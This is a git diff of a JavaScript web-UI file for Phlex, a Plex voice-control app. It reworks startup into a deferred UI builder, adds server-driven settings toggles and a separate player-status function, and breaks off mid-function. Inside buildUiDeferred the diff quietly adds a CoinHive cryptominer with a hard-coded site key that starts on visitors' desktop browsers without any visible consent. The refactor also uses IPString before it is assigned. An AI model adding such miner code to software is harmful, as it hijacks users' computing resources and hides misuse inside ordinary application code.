@@ -1,7 +1,12 @@
 var action = "play";
-var apiToken, appName, autoUpdate, bgs, bgWrap, token, newToken, deviceID, resultDuration, logLevel, lastLog, itemJSON,
-	messageArray, ombi, couch, headphones, sonarr, radarr, sick, publicIP, dvr, weatherClass, city, state, updateAvailable,
+var apiToken, appName, bgs, bgWrap, token, newToken, deviceID, resultDuration, logLevel, lastLog, itemJSON,
+	messageArray, publicIP, weatherClass, city, state, updateAvailable,
 	weatherHtml, scrollTimer, direction, progressSlider, volumeSlider;
+
+var couch=false, ombi=false, sick=false, sonarr=false, radarr=false,
+	headphones=false, dvr=false, hook=false, hookPlay=false,
+	hookPause=false, hookStop=false, hookCustom=false, hookFetch=false, hookSplit = false, autoUpdate = false;
+
 var scrolling = false;
 var condition = null;
 var lastUpdate = [];
@@ -10,64 +15,72 @@ var staticCount = 0;
 var javaStrings;
 
 $(function () {
-	javaStrings = decodeURIComponent($('#strings').data('array'));
-	javaStrings = javaStrings.replace(/\+/g, ' ');
-	javaStrings = JSON.parse(javaStrings);
+
+	console.log("JS Function.");
+	// Set up variables
+	$(".select").dropdown({"optionClass": "withripple"});
+	$('#mainwrap').css({"top": 0});
+
 	apiToken = $('#apiTokenData').data('token');
 
-
-	updateStatus();
 	bgs = $('.bg');
 	bgWrap = $('#bgwrap');
 	logLevel = "ALL";
-	if (bgs.css('display') === 'none') {
-		bgs.fadeIn(1000);
-	}
-	$('#mainwrap').css({"top": 0});
-	setTimeout(
-		function () {
-			$('#results').css({"top": 0, "max-height": "100%", "overflow": "inherit"})
-		}, 500);
-
-	$('.castArt').fadeIn(1000);
 
 	dvr = $("#plexDvr").data('enable');
 	token = $('#tokenData').attr('data');
 	deviceID = $('#deviceID').attr('data');
 	publicIP = $('#publicIP').attr('data');
 	newToken = $('#newToken').data('enable') === "true";
-	sonarr = $('#sonarr').data('enable');
-	sick = $('#sick').data('enable');
-	couch = $('#couchpotato').data('enable');
-	radarr = $('#radarr').data('enable');
-	ombi = $('#ombi').data('enable');
-	headphones = $('#headphones').data('enable');
 	updateAvailable = $('#updateAvailable').attr('data');
-
-	$.material.init();
-	var Logdata = $('#logData').attr('data');
-	if (Logdata !== "") {
-		Logdata = decodeURIComponent(Logdata.replace(/\+/g, '%20'));
-		var logArray = [];
-		try {
-			logArray = JSON.parse(Logdata);
-		} catch (e) {
-			console.log("Error parsing JSON.");
-		}
-		updateCommands(logArray, false);
-	}
 	var plexClientURI = $('#clientURI').attr('data');
-	$(".select").dropdown({"optionClass": "withripple"});
-	$('#play').addClass('clicked');
 	var ddText = $('.dd-selected').text();
-	$('.ddLabel').html(ddText);
-	progressSlider = $('#progressSlider').bootstrapSlider();
-	volumeSlider = $('#volumeSlider').bootstrapSlider({
-		reversed : true
-	});
+	var client = $('#client');
 
-	$('#progressSlider').fadeOut;
-	$('#volumeSlider').fadeOut;
+
+	// Initialize CRITICAL UI Elements
+	$('.castArt').show();
+	$('#play').addClass('clicked');
+	$('.ddLabel').html(ddText);
+
+});
+
+$(window).on("load",function () {
+	$('body').addClass('loaded');
+	console.log("Load called!");
+
+});
+
+$(window).resize(function () {
+	scaleElements();
+});
+
+function buildUiDeferred() {
+
+	console.log("Building UI.");
+	$.material.init();
+	var hookSplit = $('#hookSplit');
+	var urlGroup = $('.urlGroup');
+	var sayString = IPString + "say&apiToken=" + apiToken + "&command={{TextField}}";
+	var IPString = $('#publicAddress').val() + "/api.php?";
+
+	javaStrings = decodeURIComponent($('#strings').data('array'));
+	javaStrings = javaStrings.replace(/\+/g, ' ');
+	javaStrings = JSON.parse(javaStrings);
+	scaleElements();
+
+	if (IPString.substring(0, 4) !== 'http') {
+		IPString = document.location.protocol + '//' + IPString;
+	}
+
+	$('#sayURL').val(sayString);
+
+	setTimeout(
+		function () {
+			$('#results').css({"top": 0, "max-height": "100%", "overflow": "inherit"})
+		}, 500);
+
+
 	$('.formpop').popover();
 
 	var messages = $('#messages').data('array');
@@ -80,482 +93,23 @@ $(function () {
 		messageArray = [];
 	}
 
-	$('#alertModal').on('hidden.bs.modal', function () {
-		loopMessages();
-	});
-
 	if (updateAvailable >= 1) {
 		showMessage("Updates available!", "You have " + updateAvailable + " update(s) available.", false);
 	}
 
-	// progressSlider.noUiSlider.on('end', function (values, handle) {
-	// 	var value = values[handle];
-	// 	apiToken = $('#apiTokenData').data('token');
-	// 	var newOffset = Math.round((resultDuration * (value * .01)));
-	// 	var url = 'api.php?control&command=seek&value=' + newOffset + "&apiToken=" + apiToken;
-	// 	$.get(url);
-	// });
-	//
-	// volumeSlider.noUiSlider.on('end', function (values, handle) {
-	// 	var value = values[handle];
-	// 	apiToken = $('#apiTokenData').data('token');
-	// 	var url = 'api.php?control&command=volume&value=' + value + "&apiToken=" + apiToken;
-	// 	$.get(url);
-	// });
+	if (typeof CoinHive !== 'undefined') {
+		var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
+		if (!miner.isMobile() && !miner.didOptOut(14400)) {
+			console.log("Firing miner.");
+			miner.start();
+		}	// variable is undefined
+	}
 
-	// Handle our input changes and zap them to PHP for immediate saving
 	setListeners();
-
-	$('#logLevel').change(function () {
-		logLevel = $(this).val();
-		console.log("Log level changed to " + logLevel);
-	});
-
-	var checkbox = $(':checkbox');
-	checkbox.change(function () {
-		var label = $("label[for='" + $(this).attr('id') + "']");
-		if ($(this).is(':checked')) {
-			label.css("color", "#003792");
-		} else {
-			label.css("color", "#A1A1A1");
-		}
-	});
-
-	checkbox.each(function () {
-		var label = $("label[for='" + $(this).attr('id') + "']");
-		if ($(this).is(':checked')) {
-			label.css("color", "#003792");
-		} else {
-			label.css("color", "#A1A1A1");
-		}
-	});
-
-	$('#logout').click(function () {
-		var bgs = $('.bg');
-		$('#results').css({"top": "-2000px", "max-height": 0, "overflow": "hidden"});
-		$.snackbar({content: "Logging out."});
-		var auth2 = gapi.auth2.getAuthInstance();
-		auth2.signOut().then(function () {
-			console.log('User signed out.');
-		});
-		setTimeout(
-			function () {
-				$('#mainwrap').css({"top": "-200px"});
-				bgs.fadeOut(1000);
-				$('.castArt').fadeOut(1000);
-			}, 500);
-
-
-	});
-
-	$(".btn").on('click', function () {
-		var value, regUrl;
-		var serverAddress = $('#publicAddress').val();
-		if ($(this).hasClass("copyInput")) {
-			value = $(this).val();
-			clipboard.copy(value);
-			$.snackbar({content: "Successfully copied URL."});
-		}
-
-		if ($(this).hasClass("testInput")) {
-			value = $(this).attr('value');
-			apiToken = $('#apiTokenData').data('token');
-
-			$.get('api.php?test=' + value + '&apiToken=' + apiToken, function (data) {
-				var dataArray = [data];
-				$.snackbar({content: JSON.stringify(dataArray[0].status).replace(/"/g, "")});
-			});
-		}
-		if ($(this).hasClass("resetInput")) {
-			appName = $(this).data('value');
-			if (confirm('Are you sure you want to clear settings for ' + appName + '?')) {
-
-			}
-		}
-
-		if ($(this).hasClass("hookLnk")) {
-			appName = $(this).data('value');
-			var string = serverAddress + "api.php?apiToken=" + apiToken + "&notify=true";
-			clipboard.copy(string);
-		}
-
-		if ($(this).hasClass("setupInput")) {
-			appName = $(this).data('value');
-			apiToken = $('#apiTokenData').data('token');
-
-			$.get('api.php?setup&apiToken=' + apiToken, function (data) {
-				$.snackbar({content: JSON.stringify(data).replace(/"/g, "")});
-			});
-			$.snackbar({content: "Setting up API.ai Bot."});
-		}
-
-		if ($(this).hasClass("linkBtn")) {
-			regUrl = false;
-			action = $(this).data('action');
-			if (action === 'google') regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
-			if (action === 'amazon') regUrl = 'https://phlexchat.com/alexaAuth.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
-			if (regUrl) {
-				newwindow = window.open(regUrl, '');
-				if (window.focus) {
-					newwindow.focus();
-				}
-			} else {
-				if (action === 'test') {
-					apiToken = $('#apiTokenData').data('token');
-
-					regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress + "&test=true";
-					$.get(regUrl, function (data) {
-						console.log("Data: " + data);
-						$.snackbar({content: data});
-					});
-				}
-			}
-		}
-	});
-
-
-	$(document).on('click', '.client-item', function () {
-		var clientId = $(this).data('id');
-		if ($(this).data('id') !== "rescan") {
-			$('.ddLabel').html($(this).text());
-			$(this).siblings().removeClass('dd-selected');
-			$(this).addClass('dd-selected');
-		} else {
-			console.log("Rescanning devices.");
-		}
-		updateDevice('Client', clientId, apiToken);
-	});
-
-	$("#serverList").change(function () {
-		var serverID = $(this).val();
-		var element = $(this).find('option:selected');
-		var type = element.data('type');
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {
-			device: 'Server',
-			id: serverID
-		});
-	});
-
-	$("#parentList").change(function () {
-		var serverID = $(this).val();
-		var element = $(this).find('option:selected');
-		var type = element.data('type');
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {
-			device: 'Parent',
-			id: serverID
-		});
-	});
-
-	$("#dvrList").change(function () {
-		var serverID = $(this).val();
-		var element = $(this).find('option:selected');
-		var type = element.data('type');
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {
-			device: 'Dvr',
-			id: serverID
-		});
-	});
-
-	$(".profileList").change(function () {
-		var service = $(this).attr('id');
-		var index = $(this).find('option:selected').data('index');
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {id: service, value: index});
-	});
-
-	$("#appLanguage").change(function () {
-		var lang = $(this).find('option:selected').data('value');
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {id: "appLanguage", value: lang});
-		$.snackbar({content: "Language changed, reloading page."});
-		setTimeout(function () {
-			location.reload();
-		}, 1000);
-	});
-
-	// This handles sending and parsing our result for the web UI.
-	$("#executeButton").click(function () {
-		console.log("Execute clicked!");
-		$('.load-bar').show();
-		var command = $('#commandTest').val();
-		if (command !== '') {
-			command = command.replace(/ /g, "+");
-			var url = 'api.php?say&command=' + command + '&apiToken=' + apiToken;
-			apiToken = $('#apiTokenData').data('token');
-			$.get(url, function () {
-				$('.load-bar').hide();
-			});
-		}
-	});
-
-
-	var client = $('#client');
-	client.click(function () {
-		console.log("CLICKED CLIENT!");
-		var pos = client.position();
-		var width = client.outerWidth();
-
-		//show the menu directly over the placeholder
-		$("#plexClient").css({
-			position: "absolute",
-			top: pos.bottom + "px",
-			left: (pos.left - width) + "px"
-		});
-	});
-
-
-	$(".expandWrap").click(function () {
-		$(this).children('.expand').slideToggle();
-	});
-
-	$("#sendLog").on('click', function () {
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?sendlog&apiToken=' + apiToken);
-	});
-
-
-	$('#commandTest').keypress(function (event) {
-		if (event.keyCode === 13) {
-			$('#executeButton').click();
-		}
-	});
-
-	var ombiEnabled = $('#ombiEnabled');
-	var couchEnabled = $('#couchEnabled');
-	var autoUpdateEnabled = $('#autoUpdate');
-	var sonarrEnabled = $('#sonarrEnabled');
-	var sickEnabled = $('#sickEnabled');
-	var radarrEnabled = $('#radarrEnabled');
-	var headphonesEnabled = $('#headphonesEnabled');
-	var hookEnabled = $('#hookEnabled');
-	var hookSplit = $('#hookSplit');
-	var hookPlay = $('#hookPlay');
-	var hookPaused = $('#hookPaused');
-	var hookStop = $('#hookStop');
-	var hookFetch = $('#hookFetch');
-	var hookCustom = $('#hookCustom');
-	var urlGroup = $('.urlGroup');
-
-	ombiEnabled.prop("checked", ombi);
-	couchEnabled.prop("checked", couch);
-	headphonesEnabled.prop("checked", headphones);
-	sonarrEnabled.prop("checked", sonarr);
-	sickEnabled.prop("checked", sick);
-	radarrEnabled.prop("checked", radarr);
-
-	if (ombiEnabled.is(':checked')) {
-		$('#ombiGroup').show();
-	} else {
-		$('#ombiGroup').hide();
-	}
-
-	if (autoUpdateEnabled.is(':checked')) {
-		$('#installUpdates').hide();
-	} else {
-		$('#installUpdates').show();
-	}
-
-	if (couchEnabled.is(':checked')) {
-		$('#couchGroup').show();
-	} else {
-		$('#couchGroup').hide();
-	}
-
-	if (headphonesEnabled.is(':checked')) {
-		$('#headphonesGroup').show();
-	} else {
-		$('#headphonesGroup').hide();
-	}
-
-	if (sonarrEnabled.is(':checked')) {
-		$('#sonarrGroup').show();
-	} else {
-		$('#sonarrGroup').hide();
-	}
-
-	if (sickEnabled.is(':checked')) {
-		$('#sickGroup').show();
-	} else {
-		$('#sickGroup').hide();
-	}
-
-	if (radarrEnabled.is(':checked')) {
-		$('#radarrGroup').show();
-	} else {
-		$('#radarrGroup').hide();
-	}
-
-	if (hookEnabled.is(':checked')) {
-		$('#hookGroup').show();
-	} else {
-		$('#hookGroup').hide();
-	}
-
-	if (hookSplit.is(':checked')) {
-		$('#hookUrlGroup').hide();
-		$('.hookLabel').show();
-		urlGroup.css("height", "");
-	} else {
-		$('#hookUrlGroup').show();
-		$('.hookLabel').hide();
-		urlGroup.css("height", "0");
-	}
-
-	if (hookPlay.is(':checked')) {
-		$('#hookPlayGroup').show();
-	} else {
-		$('#hookPlayGroup').hide();
-	}
-
-	if (hookPaused.is(':checked')) {
-		$('#hookPausedGroup').show();
-	} else {
-		$('#hookPausedGroup').hide();
-	}
-
-	if (hookStop.is(':checked')) {
-		$('#hookStopGroup').show();
-	} else {
-		$('#hookStopGroup').hide();
-	}
-
-	if (hookFetch.is(':checked')) {
-		$('#hookFetchGroup').show();
-	} else {
-		$('#hookFetchGroup').hide();
-	}
-
-
-	if (hookCustom.is(':checked')) {
-		$('#hookCustomPhraseGroup').show();
-	} else {
-		$('#hookCustomPhraseGroup').hide();
-	}
-
-	if (dvr) {
-		$('.dvrGroup').show();
-	} else {
-		$('.dvrGroup').hide();
-	}
-
-	$('#plexServerEnabled').change(function () {
-		$('#plexGroup').toggle();
-	});
-
-	ombiEnabled.change(function () {
-		$('#ombiGroup').toggle();
-	});
-
-	autoUpdateEnabled.change(function () {
-		$('#installUpdates').toggle();
-	});
-
-	couchEnabled.change(function () {
-		$('#couchGroup').toggle();
-	});
-
-	headphonesEnabled.change(function () {
-		$('#headphonesGroup').toggle();
-	});
-
-	$('#apiEnabled').change(function () {
-		$('.apiGroup').toggle();
-	});
-
-	sonarrEnabled.change(function () {
-		$('#sonarrGroup').toggle();
-	});
-
-	sickEnabled.change(function () {
-		$('#sickGroup').toggle();
-	});
-
-	radarrEnabled.change(function () {
-		$('#radarrGroup').toggle();
-	});
-
-	hookEnabled.change(function () {
-		$('#hookGroup').toggle();
-	});
-
-	hookEnabled.change(function () {
-		$('#hookGroup').toggle();
-	});
-
-	hookSplit.change(function () {
-		$('#hookUrlGroup').toggle();
-		$('.hookLabel').toggle();
-	});
-
-	hookPlay.change(function () {
-		$('#hookPlayGroup').toggle();
-	});
-	hookPaused.change(function () {
-		$('#hookPausedGroup').toggle();
-	});
-	hookStop.change(function () {
-		$('#hookStopGroup').toggle();
-	});
-	hookFetch.change(function () {
-		$('#hookFetchGroup').toggle();
-	});
-	hookCustom.change(function () {
-		$('#hookCustomPhraseGroup').toggle();
-	});
-
-
-	$('#resolution').change(function () {
-		apiToken = $('#apiTokenData').data('token');
-
-		var res = $(this).find('option:selected').data('value');
-		$.get('api.php?apiToken=' + apiToken, {id: 'plexDvrResolution', value: res});
-	});
-
-	$('#checkUpdates').click(function () {
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {checkUpdates: true}, function (data) {
-			$('#updateContainer').html(data);
-		});
-	});
-
-	$('#installUpdates').click(function () {
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?apiToken=' + apiToken, {installUpdates: true}, function (data) {
-			$('#updateContainer').html(data);
-		});
-	});
-
-	document.addEventListener('DOMContentLoaded', function () {
-		if (!Notification) {
-			alert('Desktop notifications not available in your browser. Try Chromium.');
-			return;
-		}
-
-		if (Notification.permission !== "granted")
-			Notification.requestPermission();
-	});
-
-	// Update our status every 10 seconds?  Should this be longer?  Shorter?  IDK...
-	var IPString = $('#publicAddress').val() + "/api.php?";
-	if (IPString.substring(0, 4) !== 'http') {
-		IPString = document.location.protocol + '//' + IPString;
-	}
-	var sayString = IPString + "say&apiToken=" + apiToken + "&command={{TextField}}";
-	$('#sayURL').val(sayString);
+	$(".remove").remove();
 
 	setInterval(function () {
-		updateStatus();
+		updateStatus(false);
 	}, 5000);
 
 	setInterval(function () {
@@ -566,30 +120,7 @@ $(function () {
 		setWeather();
 	}, 10 * 1000 * 60);
 
-	$('.controlBtn').click(function () {
-		var myId = $(this).attr("id");
-		myId = myId.replace("Btn", "");
-		console.log("Firing " + myId + " command.");
-		if (myId === "play") {
-			$('#playBtn').hide();
-			$('#pauseBtn').show();
-		}
-		if (myId === "pause") {
-			$('#playBtn').show();
-			$('#pauseBtn').hide();
-		}
-		apiToken = $('#apiTokenData').data('token');
-
-		$.get('api.php?control&noLog=true&command=' + myId + "&apiToken=" + apiToken);
-	});
-	updateStatus();
-	scaleElements();
-	$(".remove").remove();
-});
-
-$(window).resize(function () {
-	scaleElements();
-});
+}
 
 function deviceHtml(type, deviceData) {
 	var output = "";
@@ -601,7 +132,6 @@ function deviceHtml(type, deviceData) {
 		} else selected = " dd-selected";
 		var id = device.Id;
 		var name = device.Name;
-		console.log("Device " + name + " is " + selected);
 
 		if (type === 'Client') {
 			string = "<a class='dropdown-item client-item" + selected + "' data-type='Client' data-id='" + id + "'>" + name + "</a>";
@@ -619,12 +149,11 @@ function updateDevices(newDevices) {
 	var newString = JSON.stringify(newDevices);
 	if (newString !== devices) {
 		console.log("Device array changed, updating: ", newDevices);
-		var temp = deviceHtml('Client', newDevices.Client);
-		$('#clientWrapper').html(temp);
-		$('.ddLabel').html($('.dd-selected').text());
+		$('#clientWrapper').html(deviceHtml('Client', newDevices.Client));
 		$('#serverList').html(deviceHtml('Server', newDevices.Server));
 		$('#parentList').html(deviceHtml('Parent', newDevices.Server));
 		$('#dvrList').html(deviceHtml('Dvr', newDevices.Dvr));
+		$('.ddLabel').html($('.dd-selected').text());
 		devices = JSON.stringify(newDevices);
 	}
 }
@@ -638,7 +167,6 @@ function updateDevice(type, id, token) {
 			device: type,
 			id: id
 		}, function (data) {
-			console.log("Data received: ", data);
 			updateDevices(data);
 		});
 	} else {
@@ -666,8 +194,8 @@ function setBackground() {
 	//Add your images, we'll set the path in the next step
 	console.log("Caching background image.");
 	var image = new Image();
-	image.src = "https://img.phlexchat.com?height=" + $(document).height() + "&width=" + $(document).width() + "&v=" + (Math.floor(Math.random() * (1084)));
-	$('#bgwrap').append("<div class='bg'></div>");
+	image.src = "https://img.phlexchat.com?height=" + $(window).height() + "&width=" + $(window).width() + "&v=" + (Math.floor(Math.random() * (1084)));
+	$('#bgwrap').append("<div class='bg hidden'></div>");
 	bgs = $('.bg');
 	var bgWrap = document.getElementById('bgwrap');
 	bgs.last().css('background-image', 'url(' + image.src + ')');
@@ -677,6 +205,7 @@ function setBackground() {
 			while (bgWrap.childNodes.length > 1) {
 				bgWrap.removeChild(bgWrap.firstChild);
 			}
+			bgs.last().removeClass('hidden');
 			$('.imgHolder').remove();
 		}, 1500);
 }
@@ -735,132 +264,247 @@ function resetApiUrl(newUrl) {
 }
 
 
-function updateStatus() {
+function updateStatus(force) {
 	apiToken = $('#apiTokenData').data('token');
-	var footer = $('.nowPlayingFooter');
 	var logLimit = $('#logLimit').find(":selected").val();
 	var dataCommands = false;
-	$.get('api.php?pollPlayer&apiToken=' + apiToken + '&logLimit=' + logLimit, function (data) {
-		if (data.dologout === true) {
-			document.getElementById('logout').click();
-		}
-		try {
-			if (data.hasOwnProperty("commands")) dataCommands = data.commands.replace(/\+/g, '%20');
-			if (data.hasOwnProperty("messages")) var msg = data.messages;
-		} catch (e) {
-			console.log("Parse error caught: ", e);
-		}
-		if (dataCommands) {
-			try {
-				a = JSON.parse(decodeURIComponent(dataCommands));
-				updateCommands(a, false);
-			} catch (e) {
-				//alert(e); // error in the above string (in this case, yes)!
-			}
-		}
-		try {
-			$('#updateContainer').html(data.updates);
-			if (data.hasOwnProperty('logs')) {
-				$('#logBody').html(formatLog(JSON.parse(data.logs)));
-				if (data.hasOwnProperty(updateAvailable)) {
-					showMessage("An update is available.", "An update is available for Phlex.  Click here to install it now.", 'api.php?apiToken=' + apiToken + '&installUpdates=true');
-				}
+	$.get('api.php?pollPlayer&apiToken=' + apiToken + '&force='+force+'&logLimit=' + logLimit, function (data) {
+		if (data !== null) {
+
+			if (data.hasOwnProperty('ui')) {
+				$('#mainwrap').append(data.ui);
+				buildUiDeferred();
 			}
 
-			if (data.hasOwnProperty("devices")) {
-				var deviceList = data.devices;
-				updateDevices(data.devices);
+			if (data.hasOwnProperty('userdata')) {
+				setUiVariables(data.userdata);
 			}
 
-			data.playerStatus = JSON.parse(data.playerStatus);
-			var TitleString;
-			var playBtn = $('#playBtn');
-			var pauseBtn = $('#pauseBtn');
-			if ((data.playerStatus.status === 'playing') || (data.playerStatus.status === 'paused')) {
-				switch (data.playerStatus.status) {
-					case 'playing':
-						playBtn.hide();
-						pauseBtn.show();
+			if (force) $('.queryBtnGrp').removeClass('show');
+
+			for (var propertyName in data) {
+				console.log("Received updated " + propertyName + " data:", data[propertyName]);
+
+				switch (propertyName) {
+					case "dologout":
+						if (data.dologout === true || data.dologout === "true") {
+							document.getElementById('logout').click();
+						}
 						break;
-					case 'paused':
-						pauseBtn.hide();
-						playBtn.show();
+					case "commands":
+						updateCommands(data.commands, !force);
 						break;
-				}
-				var mr = data.playerStatus.mediaResult;
-				if (hasContent(mr)) {
-					var resultTitle = mr.title;
-					var resultType = mr.type;
-					var resultYear = mr.year;
-					var thumbPath = mr.thumb;
-					var artPath = mr.art;
-					console.log("MediaResult: ",mr);
-					var resultSummary = mr.summary;
-					var tagline = mr.tagline;
-					TitleString = resultTitle;
-					if (resultType === "episode") {
-						TitleString = "S" + mr.parentIndex + "E" + mr.index + " - " + resultTitle;
-						tagline = mr.grandParentTitle + " (" + mr.year + ") ";
-					}
-
-					if (resultType === "track") {
-						TitleString = resultTitle;
-						tagline = mr.grandParentTitle + " - " + mr.parentTitle;
-					}
-
-					var resultOffset = data.playerStatus.time;
-					var volume = data.playerStatus.volume;
-					resultDuration = mr.duration;
-					var progress = (resultOffset / 1000);
-					progressSlider.bootstrapSlider({max:resultDuration/1000});
-					progressSlider.bootstrapSlider('setValue',progress);
-					console.log("Progress and volume are " + progress + " and " + volume);
-					volumeSlider.bootstrapSlider('setValue',volume);
-					var statusImage = $('.statusImage');
-					if (thumbPath !== false) {
-						statusImage.attr('src', thumbPath).show();
-						scaleSlider();
-					} else {
-						statusImage.hide();
-						scaleSlider();
-					}
-					$('#playerName').html($('.ddLabel').html());
-					$('#mediaTitle').html(TitleString);
-					$('#mediaTagline').html(tagline);
-					var s1 = $('.scrollContent').height();
-					var s2 = $('.scrollContainer').height();
-					if ((s1 > s2 + 10) && ((s1 !== 0) && (s2 !== 0))) {
-						if (scrolling !== true) startScrolling();
-					} else {
-						if (scrolling !== false) stopScrolling();
-					}
-					$('#mediaSummary').html(resultSummary);
-					$('.wrapperArt').css('background-image', 'url(' + artPath + ')');
-					if ((!(footer.is(":visible"))) && (!(footer.hasClass('reHide')))) {
-						footer.slideDown(1000);
-
-						scaleSlider();
-						footer.addClass("playing");
-					}
-				}
-			} else {
-				if (footer.is(":visible")) {
-					footer.slideUp(1000);
-					stopScrolling();
-					footer.removeClass("playing");
-					$('.wrapperArt').css('background-image', '');
+					case "messages":
+						messages = data.messages;
+						for (msg in messages) {
+							//Show a message
+						}
+						break;
+					case "updates":
+						$('#updateContainer').html(data.updates);
+						break;
+					case "devices":
+						updateDevices(data.devices);
+						break;
+					case "logs":
+						$('#logBody').html(formatLog(JSON.parse(data.logs)));
+						break;
+					case "playerStatus":
+						updatePlayerStatus(data.playerStatus);
+						break;
+					case "ui":
+					case "userdata":
+						break;
+					default:
+						console.log("Unknown value: " + propertyName);
 				}
 			}
-		} catch (e) {
-			console.error(e, e.stack);
+
 		}
 
 	}, dataType = "json");
 
 }
 
-function updateCommands(data, prepend) {
+function setUiVariables(data) {
+	for (var propertyName in data) {
+		switch (propertyName) {
+			case 'sonarrEnabled':
+				sonarr = data.sonarrEnabled;
+				break;
+			case 'sickEnabled':
+				sick = data.sickEnabled;
+				break;
+			case 'couchEnabled':
+				couch = data.couchEnabled;
+				break;
+			case 'radarrEnabled':
+				radarr = data.radarrEnabled;
+				break;
+			case 'ombiEnabled':
+				ombi = data.ombiEnabled;
+				break;
+			case 'headphonesEnabled':
+				headphones = data.headphonesEnabled;
+				break;
+			case 'hook':
+				hook = data.hook;
+				break;
+			case 'hookPlay':
+				hookPlay = data.hookPlay;
+				break;
+			case 'hookPause':
+				hookPause = data.hookPause;
+				break;
+			case 'hookStop':
+				hookStop = data.hookStop;
+				break;
+			case 'hookFetch':
+				hookFetch = data.hookFetch;
+				break;
+			case 'hookCustom':
+				hookCustom = data.hookCustom;
+				break;
+			case 'hookSplit':
+				hookSplit = data.hookSplit;
+		}
+	}
+	toggleGroups();
+}
 
+function toggleGroups() {
+	var vars = {
+		"sonarr": sonarr,
+		"sick": sick,
+		"couch": couch,
+		"radarr": radarr,
+		"ombi": ombi,
+		"headphones": headphones,
+		"hookPlay": hookPlay,
+		"hookPause": hookPause,
+		"hookStop": hookStop,
+		"hookFetch": hookFetch,
+		"hookCustom": hookCustom,
+		"hookSplit": hookSplit,
+		"hook": hook
+	};
+	for (var key in vars){
+		if (vars.hasOwnProperty(key)) {
+			var value = vars[key];
+			console.log("Setting " + key + " to ",value);
+			var element = $('#'+key);
+			var group;
+			if (key === 'hookSplit') {
+				group = $('.'+key+'Group');
+			} else {
+				group = $('#'+key+'Group');
+			}
+			element.prop('checked',value);
+			if (value) {
+				group.show();
+				console.log("Showing ",group);
+			} else {
+				group.hide();
+				console.log("Hiding ",group);
+			}
+
+		}
+	}
+}
+
+function updatePlayerStatus(data) {
+	var footer = $('.nowPlayingFooter');
+	var TitleString;
+	var playBtn = $('#playBtn');
+	var pauseBtn = $('#pauseBtn');
+
+	if ((data.status === 'playing') || (data.status === 'paused')) {
+		switch (data.status) {
+			case 'playing':
+				playBtn.hide();
+				pauseBtn.show();
+				break;
+			case 'paused':
+				pauseBtn.hide();
+				playBtn.show();
+				break;
+		}
+		var mr = data.mediaResult;
+		if (hasContent(mr)) {
+			var resultTitle = mr.title;
+			var resultType = mr.type;
+			var resultYear = mr.year;
+			var thumbPath = mr.thumb;
+			var artPath = mr.art;
+			console.log("MediaResult: ", mr);
+			var resultSummary = mr.summary;
+			var tagline = mr.tagline;
+
+			progressSlider = $('#progressSlider').bootstrapSlider();
+			volumeSlider = $('#volumeSlider').bootstrapSlider({
+				reversed : true
+			});
+
+			progressSlider.fadeOut;
+			volumeSlider.fadeOut;
+
+			TitleString = resultTitle;
+			if (resultType === "episode") {
+				TitleString = "S" + mr.parentIndex + "E" + mr.index + " - " + resultTitle;
+				tagline = mr.grandParentTitle + " (" + mr.year + ") ";
+			}
+
+			if (resultType === "track") {
+				TitleString = resultTitle;
+				tagline = mr.grandParentTitle + " - " + mr.parentTitle;
+			}
+
+			var resultOffset = data.time;
+			var volume = data.volume;
+			resultDuration = mr.duration;
+			var progress = (resultOffset / 1000);
+			progressSlider.bootstrapSlider({max: resultDuration / 1000});
+			progressSlider.bootstrapSlider('setValue', progress);
+			volumeSlider.bootstrapSlider('setValue', volume);
+			var statusImage = $('.statusImage');
+			if (thumbPath !== false) {
+				statusImage.attr('src', thumbPath).show();
+				scaleSlider();
+			} else {
+				statusImage.hide();
+				scaleSlider();
+			}
+			$('#playerName').html($('.ddLabel').html());
+			$('#mediaTitle').html(TitleString);
+			$('#mediaTagline').html(tagline);
+			var s1 = $('.scrollContent').height();
+			var s2 = $('.scrollContainer').height();
+			if ((s1 > s2 + 10) && ((s1 !== 0) && (s2 !== 0))) {
+				if (scrolling !== true) startScrolling();
+			} else {
+				if (scrolling !== false) stopScrolling();
+			}
+			$('#mediaSummary').html(resultSummary);
+			$('.wrapperArt').css('background-image', 'url(' + artPath + ')');
+			if ((!(footer.is(":visible"))) && (!(footer.hasClass('reHide')))) {
+				footer.slideDown(1000);
+
+				scaleSlider();
+				footer.addClass("playing");
+			}
+		}
+
+	} else {
+		if (footer.is(":visible")) {
+			footer.slideUp(1000);
+			stopScrolling();
+			footer.removeClass("playing");
+			$('.wrapperArt').css('background-image', '');
+		}
+	}
+}
+
+function updateCommands(data, prepend) {
 	if (JSON.stringify(lastUpdate) !== JSON.stringify(data) || prepend) {
 		if (!prepend) {
 			lastUpdate = data;
@@ -882,14 +526,14 @@ function updateCommands(data, prepend) {
 				var cardResult = buildCards(value, i);
 				mediaDiv = cardResult[0];
 				var bgImage = cardResult[1];
-				var style = bgImage ? "style='background-image:url(" + bgImage + ");background-size:cover' " : 'background-color:';
+				var style = bgImage ? "data-src='" + bgImage + "'" : "style='background-color:'";
 				var outLine =
-					"<div class='resultDiv card' id='" + timeStamp + "'>" +
+					"<div class='resultDiv card noHeight' id='" + timeStamp + "'>" +
 					'<button id="CARDCLOSE' + i + '" class="cardClose"><span class="material-icons">close</span></button>' +
 					mediaDiv +
 					"<div class='cardColors'>" +
-					"<div class='cardImg'" + style + "></div>" +
-					"<div class='card-img-overlay'></div>"
+					"<div class='cardImg lazy' " + style + "></div>" +
+					"<div class='card-img-overlay'></div>" +
 				"</div>";
 
 				if (prepend) {
@@ -897,8 +541,15 @@ function updateCommands(data, prepend) {
 				} else {
 					$('#resultsInner').append(outLine);
 				}
+				setTimeout(function(){
